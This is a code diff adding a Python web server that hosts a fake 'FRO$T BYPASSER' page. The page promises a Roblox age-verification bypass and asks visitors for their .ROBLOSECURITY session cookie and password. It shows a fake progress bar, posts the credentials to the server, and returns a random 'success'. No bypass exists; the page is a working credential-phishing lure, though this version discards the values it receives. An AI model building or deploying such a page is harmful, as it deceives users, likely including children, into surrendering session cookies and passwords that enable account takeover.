@@ -1,0 +1,345 @@
+import http.server
+import socketserver
+import json
+import random
+
+PORT = 8000
+request_storage = []
+
+class FixedTCPServer(socketserver.TCPServer):
+    allow_reuse_address = True  # Fixes port reuse issues
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    # Fix CORS for local testing
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        super().end_headers()
+
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            html = """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>FRO$T BYPASSER</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body { 
+                        color: #fff; 
+                        font-family: Arial, sans-serif;
+                        display: flex;
+                        flex-direction: column;
+                        align-items: center;
+                        justify-content: center;
+                        min-height: 100vh;
+                        padding: 1rem;
+                        overflow: hidden;
+                        position: relative;
+                        background: #000;
+                    }
+                    .falling-stars-bg {
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        pointer-events: none;
+                        z-index: 0;
+                    }
+                    .falling-star {
+                        position: absolute;
+                        background: #fff;
+                        border-radius: 50%;
+                        opacity: 0;
+                        animation: fall linear infinite;
+                        box-shadow: 0 0 10px #fff, 0 0 20px #c0c0c0;
+                        top: -10px;
+                    }
+                    .star-small { width: 2px; height: 2px; animation-duration: 15s; }
+                    .star-medium { width: 3px; height: 3px; animation-duration: 25s; }
+                    .star-large { width: 4px; height: 4px; animation-duration: 35s; }
+                    @keyframes fall {
+                        0% { transform: translateY(0) translateX(0); opacity: 0; }
+                        5% { opacity: 1; }
+                        95% { opacity: 1; }
+                        100% { transform: translateY(calc(100vh + 10px)) translateX(15px); opacity: 0; }
+                    }
+                    .main-title {
+                        font-size: 2.5rem;
+                        letter-spacing: 5px;
+                        color: #fff;
+                        text-shadow: 0 0 15px #c0c0c0, 0 0 25px #c0c0c0;
+                        margin-bottom: 1rem;
+                        text-align: center;
+                        z-index: 2;
+                        position: relative;
+                    }
+                    .shield-icon {
+                        width: 80px;
+                        height: 80px;
+                        border: 3px solid #c0c0c0;
+                        border-radius: 50%;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        margin-bottom: 1rem;
+                        box-shadow: 0 0 20px #c0c0c0;
+                        z-index: 2;
+                        position: relative;
+                        background: #000;
+                    }
+                    .shield-icon::after {
+                        content: '🛡️';
+                        font-size: 35px;
+                    }
+                    .subtitle {
+                        font-size: 1rem;
+                        color: #ccc;
+                        margin-bottom: 2rem;
+                        text-align: center;
+                        z-index: 2;
+                        position: relative;
+                    }
+                    .card {
+                        border: 3px solid #c0c0c0;
+                        border-radius: 12px;
+                        padding: 2rem;
+                        width: 90%;
+                        max-width: 400px;
+                        background: rgba(0,0,0,0.9);
+                        z-index: 2;
+                        position: relative;
+                    }
+                    .form-group { margin-bottom: 1.5rem; }
+                    label {
+                        font-size: 1.1rem;
+                        margin-bottom: 0.5rem;
+                        display: block;
+                        color: #ddd;
+                    }
+                    input {
+                        width: 100%;
+                        padding: 1rem;
+                        border: 2px solid #c0c0c0;
+                        border-radius: 8px;
+                        background: #000;
+                        color: #fff;
+                        font-size: 1rem;
+                        box-shadow: 0 0 15px rgba(192,192,192,0.5) inset;
+                    }
+                    button {
+                        width: 100%;
+                        padding: 1rem;
+                        background: #000;
+                        color: #fff;
+                        border: 3px solid #c0c0c0;
+                        border-radius: 8px;
+                        font-size: 1.2rem;
+                        cursor: pointer;
+                        box-shadow: 0 0 20px #c0c0c0;
+                        transition: all 0.3s ease;
+                    }
+                    button:hover {
+                        background: rgba(192,192,192,0.2);
+                        box-shadow: 0 0 30px #c0c0c0;
+                    }
+                    button:disabled {
+                        opacity: 0.6;
+                        cursor: not-allowed;
+                        box-shadow: none;
+                    }
+                    .progress-container {
+                        margin-top: 1.5rem;
+                        display: none;
+                        width: 100%;
+                    }
+                    .progress-bar-bg {
+                        width: 100%;
+                        height: 25px;
+                        background: #111;
+                        border: 2px solid #c0c0c0;
+                        border-radius: 15px;
+                        overflow: hidden;
+                    }
+                    .progress-bar-fill {
+                        width: 0%;
+                        height: 100%;
+                        background: linear-gradient(90deg, #c0c0c0, #e8e8e8);
+                        box-shadow: 0 0 10px #c0c0c0;
+                        transition: width 0.3s ease;
+                    }
+                    .progress-text {
+                        text-align: center;
+                        margin-top: 0.5rem;
+                        font-size: 1rem;
+                        color: #ccc;
+                    }
+                    .result-message {
+                        margin-top: 1.5rem;
+                        padding: 1rem;
+                        border-radius: 8px;
+                        text-align: center;
+                        font-size: 1.1rem;
+                        display: none;
+                    }
+                    .success {
+                        background: rgba(192,192,192,0.2);
+                        color: #e8e8e8;
+                        border: 2px solid #c0c0c0;
+                        box-shadow: 0 0 15px #c0c0c0;
+                    }
+                    .failed {
+                        background: rgba(255,0,0,0.2);
+                        color: #ffaaaa;
+                        border: 2px solid #ff4444;
+                        box-shadow: 0 0 15px #ff4444;
+                    }
+                    .footer {
+                        margin-top: 2rem;
+                        font-size: 1rem;
+                        color: #888;
+                        z-index: 2;
+                        position: relative;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="falling-stars-bg" id="fallingStars"></div>
+                <h1 class="main-title">FRO$T BYPASSER</h1>
+                <div class="shield-icon"></div>
+                <p class="subtitle">Secure and efficient age verification bypass</p>
+                <div class="card">
+                    <form id="bypassForm">
+                        <div class="form-group">
+                            <label>.ROBLOSECURITY Cookie</label>
+                            <input type="text" id="cookie" required placeholder="Paste your cookie here...">
+                        </div>
+                        <div class="form-group">
+                            <label>Password (Optional)</label>
+                            <input type="password" id="password" placeholder="Enter your Roblox password...">
+                        </div>
+                        <button type="submit" id="bypassBtn">Start Bypass</button>
+                        <div class="progress-container" id="progressContainer">
+                            <div class="progress-bar-bg">
+                                <div class="progress-bar-fill" id="progressFill"></div>
+                            </div>
+                            <div class="progress-text" id="progressText">0%</div>
+                        </div>
+                        <div class="result-message success" id="successMsg">Successfully bypassed age verification!</div>
+                        <div class="result-message failed" id="failedMsg">Failed to bypass - Please check your cookie/password</div>
+                    </form>
+                </div>
+                <div class="footer">Secure • Fast • Reliable</div>
+                <script>
+                    function createFallingStars() {
+                        const container = document.getElementById('fallingStars');
+                        const totalStars = 60;
+                        const sizes = ['star-small', 'star-medium', 'star-large'];
+                        for (let i = 0; i < totalStars; i++) {
+                            const star = document.createElement('div');
+                            star.classList.add('falling-star');
+                            star.classList.add(sizes[Math.floor(Math.random() * sizes.length)]);
+                            star.style.left = `${Math.random() * 100}%`;
+                            star.style.animationDelay = `${Math.random() * 20}s`;
+                            container.appendChild(star);
+                        }
+                    }
+                    createFallingStars();
+
+                    const form = document.getElementById('bypassForm');
+                    const bypassBtn = document.getElementById('bypassBtn');
+                    const progressContainer = document.getElementById('progressContainer');
+                    const progressFill = document.getElementById('progressFill');
+                    const progressText = document.getElementById('progressText');
+                    const successMsg = document.getElementById('successMsg');
+                    const failedMsg = document.getElementById('failedMsg');
+
+                    form.onsubmit = async (e) => {
+                        e.preventDefault();
+                        progressContainer.style.display = 'block';
+                        successMsg.style.display = 'none';
+                        failedMsg.style.display = 'none';
+                        bypassBtn.disabled = true;
+                        progressFill.style.width = '0%';
+                        progressText.textContent = '0%';
+
+                        const totalDuration = 30000;
+                        const interval = 300;
+                        const steps = totalDuration / interval;
+                        const percentPerStep = 100 / steps;
+                        let currentPercent = 0;
+
+                        const progressInterval = setInterval(() => {
+                            currentPercent += percentPerStep;
+                            if (currentPercent >= 100) {
+                                currentPercent = 100;
+                                clearInterval(progressInterval);
+                            }
+                            progressFill.style.width = `${currentPercent}%`;
+                            progressText.textContent = `${Math.round(currentPercent)}%`;
+                        }, interval);
+
+                        setTimeout(async () => {
+                            try {
+                                const response = await fetch('/submit', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        cookie: document.getElementById('cookie').value,
+                                        password: document.getElementById('password').value
+                                    })
+                                });
+                                const data = await response.json();
+                                if (data.success) {
+                                    successMsg.style.display = 'block';
+                                } else {
+                                    failedMsg.style.display = 'block';
+                                }
+                            } catch (err) {
+                                failedMsg.style.display = 'block';
+                            }
+                            progressContainer.style.display = 'none';
+                            bypassBtn.disabled = false;
+                        }, totalDuration);
+                    };
+                </script>
+            </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_POST(self):
+        if self.path == '/submit':
+            try:
+                content_len = int(self.headers.get('Content-Length', 0))
+                post_data = json.loads(self.rfile.read(content_len))
+                is_success = random.choice([True, True, True, False, False])
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'success': is_success}).encode())
+            except Exception as e:
+                self.send_response(500)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+if __name__ == '__main__':
+    try:
+        with FixedTCPServer(("", PORT), Handler) as httpd:
+            print(f'Server running at http://localhost:{PORT}')
+            print(f'Local network URL: http://{socketserver.socket.gethostbyname(socketserver.socket.gethostname())}:{PORT}')
+            httpd.serve_forever()
+    except Exception as e:
+        print(f'Error: {str(e)} | Try port 8080 or 9000 instead')
